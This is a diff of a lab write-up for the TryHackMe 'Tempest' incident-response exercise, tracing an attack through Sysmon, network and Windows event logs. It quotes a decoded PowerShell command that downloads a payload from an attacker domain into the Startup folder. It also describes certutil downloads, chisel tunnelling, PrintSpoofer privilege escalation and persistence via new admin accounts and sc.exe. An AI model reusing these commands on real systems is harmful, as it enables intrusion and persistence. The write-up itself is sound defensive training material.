@@ -54,9 +54,9 @@ I used
 [CyberChef](https://gchq.github.io/CyberChef/)
 to decode the base64 string which gave me this:
 
->\$app=[Environment]::GetFolderPath('ApplicationData');cd "\$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
+>\$app=[Environment]::GetFolderPath('ApplicationData');cd "\$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr `http://phishteam.xyz/02dcf07/update.zip` -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
 
-This command going to the Startup directory in windows, uses Invoke Web Request (iwr) to download **update.zip** from **phishteam.xyz**, uses **-outfile** to specify the directory path, unzipz the contents of **update.zip** and then removes the original zip file.
+This command is going to the Startup directory in windows on the logged-in user, uses Invoke Web Request (iwr) to download **update.zip** from **phishteam.xyz**, uses **-outfile** to specify the directory path, unzipz the contents of **update.zip** and then removes the original zip file.
 What this achieves is a new file within the Startup directory, which is used to run programs on startup.
 
 To see if I could quickly find out what CVE this is I tried using AI to search for the application used to run the command, the file directory used, and the powershell usage.
@@ -67,64 +67,233 @@ The **DogWalk** vulnerability that the AI described didn't match with what's bee
 
 ## Initial Access - Stage 2 Execution
 
-*The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?*
+Time to look at how the payload executed.
 
-*The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?*
+from the previous section we know that the payload extracted files here:
 
-*Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?*
+>C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
-*The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?*
+Since the logs are only tracking what specific actions happened on the computer, we cant just get the files and investigate that way. The previous command that was found used Powershell, so I tried searching for anything that used Powershell and I found this:
+
+<img src="images/powershell2.png" alt="powershell command downloading and running first.exe">
+
+This command is using Powershell to run a command, uses the **-w hidden** parameter to hide in the background, **-noni** is used to tell powershell that no user input is expected, **certutil -urlcache -split** is used to specify a following URL to download a file, **-f** is used to overwrite a file incase an existing file has the same name as the downloaded file, and we see that powershell is installing **first.exe**:
+
+>`http://phishteam.xyz/02dcf07/first.exe`
+
+The following part **C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe** is used to tell powershell to download the file to the Downloads folder, followed by a semicolon which indicates to run the next parameter which in this case is the downloaded file. All of this was downloaded in the Startup folder of windows, so anytime the machine boots up into the benimaru account, all of what was just detailed will happen.
+
+Looking at the sysmon logs we can find the SHA256 hash of the malicious binary downloaded:
+
+<img src="images/sha256_of_first.png" alt="SHA256 hash of first.exe">
+
+>CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
+
+Looking at what happens when **first.exe** runs, we see it tries to establish a connection to `resolvecyber.xyz`
+
+<img src="images/resolvecyber.png" alt="resolvecyber">
 
 ## Initial Access - Malicious Document Traffic
 
-*What is the URL of the malicious payload embedded in the document?*
+Now that we have several network related artefacts it's time to look at network events. For this section I'll be using Brim to investigate the network traffic.
 
-*What is the encoding used by the attacker on the c2 connection?*
+Searching for how the network traffic began we can see the **phishteam** domain again, followed by a connection to the **index.html** page.
 
-*The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?*
+<img src="images/network1.png" alt="initial network traffic">
 
-*The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?*
 
-*What is the HTTP method used by the binary?*
+Looking deeper into the network traffic logs, I found that DNS tunneling was being used to exfiltrate data.
 
-*Based on the user agent, what programming language was used by the attacker to compile the binary?*
+<img src="images/DNS_tunneling.png" alt="DNS Tunneling">
+
+We can see that the data is being encoded in **base64** and is using the **q** parameter to indicate data being sent.
+
+Looking closer into a random log I picked out from the data exfiltration list, we can also see that the user agent is using **Nim** to compile the binary.
+
+<img src="images/user_agent.png" alt="user agent">
 
 ## Discovery - Internal Reconnaissance
 
-*The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?*
+The attacker was able to exfiltrate data, and we know exactly what data was sent because we have the network traffic logs (encoded in base64).
 
-*The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?*
+I went through and decoded a few of the base64 queries and found this:
 
-*The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?*
+<img src="images/cyberchef2.png" alt="data exfiltration decoded">
 
-*What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?*
+We can see that the attacker was able to find a password to benimaru: **infernotempest**
 
-*What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.*
+Decoding a few more chunks of base64 from the network traffic logs I then found this:
+<img src="images/cyberchef3.png" alt="data exfiltration decoded">
 
-*The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?*
+Port **5985** can be used to establish a remote shell because it is also the default port used for Windows Remote Management **(WinRM)** via HTTP
+
+According to the TryHackMe notes in the lab, a reverse socks proxy was established to access internal services inside the machine. Going back to Timeline Explorer I tried searching for "socks" and I was met with this result:
+
+<img src="images/Rsocks.png" alt="reverse socks proxy">
+
+
+Looking closer into this log I found the SHA256 hash of the binary used to establish the connection:
+
+<img src="images/RsocksHash.png" alt="reverse socks proxy hash">
+
+>8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
+
+I tried searching for the Hash on virustotal to see what would come up.
+
+<img src="images/virustotal.png" alt="virus total result (its bad)">
+
+Looking through the details tab this binary goes by several names, though it seems to be commonly referred to as **chisel** because almost every variation has it in the name.
+
+```
+ihpsmxpuwy.exe
+chisel.exe
+ch.exe
+chisel_windows.exe
+8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451.exe
+_8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451.exe
+chisel
+winch.exe
+527C71C523D275C8367B67BBEBF48E9F
+chisel_1.7.7_windows_amd64
+TCP_UDP_Tunnel_over_HTTP_(Chisel).EXE
+chisel_1.7.7_windows_amd64.exe
+chisel86.exe
+chisel64.exe
+NA_chiselexe.exe
+hvirt.exe
+chisel2.exe
+chisel.exe.bak
+svhost.exe
+chisel.SxxLTSJR.exe.part
+c.exe
+conhosts.exe
+dev.exe
+chiselw
+1.exe
+chisel_amd64.exe
+```
 
 ## Privilege Escalation - Exploiting Privileges
 
-*After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?*
+Time to look for events after the reverse socks proxy connection was established.
 
-*Based on the SHA256 hash of the binary, what is the name of the tool used?*
+Looking at the logs after this connection this powershell command was run.
 
-*The tool exploits a specific privilege owned by the user. What is the name of the privilege?*
+<img src="images/more_powershell.png" alt="powershell execution after the reverse socks proxy connection">
+
+This is downloading a file named **spf.exe**, and looking closer into it I found the SHA256 hash of the binary here:
+
+<img src="images/spf_hash.png" alt="spf.exe SHA256 hash">
+
+>8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D
+
+Searching for this hash on virus total gives us this result:
+
+<img src="images/spf_virustotal.png" alt="virus total result for spf.exe">
+
+Looking at the details tab for what this binary is called we get an enormous list of names that this has been referred to as.
+
+```
+p7dd41a65.exe
+sop.exe
+FSSA_Document_1792952889.exe
+PrintSpoofer64.exe
+Bk3A39.tmp
+psSP31789.txt
+ps.exe
+816ce080-f39e-11ea-8fc2-8afb7b4f4821
+LogRhythmARM.exe
+PrintSpoofer.exe
+ps64.exe
+PrintSpoofer64.exe.1
+prtspr(1).exe
+prtspr.exe
+octet-stream
+P64.exe
+p.exe
+tempPrintSpoofer64.exe
+LogRhythmWeb.exe
+print64.exe
+SpooferBizone.exe
+printspoofer_108da75de148145b8f056ec0827f1665
+lol.exe
+svchost.exe
+windowsDefender123321.exe
+printspoofer.exe
+S64.exe
+hcSmyg0I.exe.part
+PrintSpoofer64(1).exe
+_8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d.exe
+8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d.EXPLOIT.exe
+UnpackedMal98.exe
+a4o8puh4-p6.exe
+printspoofer64.exe
+spooler.exe
+check.exe
+babaca.exe
+8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d
+AllWindows.Persistence.Wow64cpu.csv
+f_0004e5
+smartscreen.exe
+spoofer.exe
+prints64.exe
+potato.exe
+print.exe
+PF64.exe
+start.exe
+3081d458-d0f7-481a-9bb2-be12aba4c645
+minkay.exe
+PS.exe
+PrintSpoofer641.exe
+dotnetserv.exe
+PrintSpoofer64lkkk.exe
+```
+
+Like with the last hash we looked at on virus total, this binary can't figure out what it wants to be but judging from the list it commonly goes by **PrintSpoofer**. 
+
+Doing more research into **PrintSpoofer** I found a GitHub link 
+[here](https://github.com/itm4n/printspoofer).
+
+According to the README it explains that it works by abusing **SeImpersonatePrivilege** from **LOCAL/NETWORK SERVICE** to **SYSTEM**.
 
 *Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?*
 
-*The binary connects to a different port from the first c2 connection. What is the port used?*
+Now that we know what **spf.exe** could be doing I tried searching for it in the logs, and we can see that it's used to download another binary named **final.exe**
+
+<img src="images/spf_search.png" alt="spf search">
+
+We can see after **final.exe** is downloaded it runs and uses port **8080**
+
+<img src="images/final_port.png" alt="destination port">
 
 ## Actions on Objectives - Fully-owned Machine
 
-*Upon achieving SYSTEM access, the attacker then created two users. What are the account names?*
+Now that the attackers have administrative privileges to the machine, they're likely going to add persistence techniques to keep what they now have.
 
-*Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?*
+For this section I'll be using Windows Event Logs.
 
-*Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?*
+There's a very good chance that the attackers created new user accounts, so I searched for the Windows Event ID **4720** because it indicates a successful creation of a new user.
 
-*The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?*
+<img src="images/shion.png" alt="new user named shion">
 
-*Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?*
+<img src="images/shuna.png" alt="new user named shuna">
+
+Looking at the logs in Timeline Explorer and searching for the new user creation, we can see that the attacker forgot to add the **/add** parameter when creating a new user.
+
+<img src="images/forgot_add_command.png" alt="forgot to add /add">
+
+Looking closer into Timeline Explorer we can see that the **shion** user was added to the administrators group
+
+<img src="images/localgroup_add.png" alt="adding shion to administrators group"> 
 
 *After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?*
+
+Once the account was created we can see that the attacker runs this command.
+
+<img src="images/tempest_final.png" alt="persistent administrative access">
+
+This command uses **sc.exe** (Service Controls Manager) which is a windows command line tool used to configure Windows services. We can see that this command is instruction **sc.exe** to run **final.exe** whenever the system starts (with the usage of the attackers administrative privileges).
+
+## Conclusion
+
+Overall this was a really fun room to complete, there's alot going on, and you use several tools which is always great.
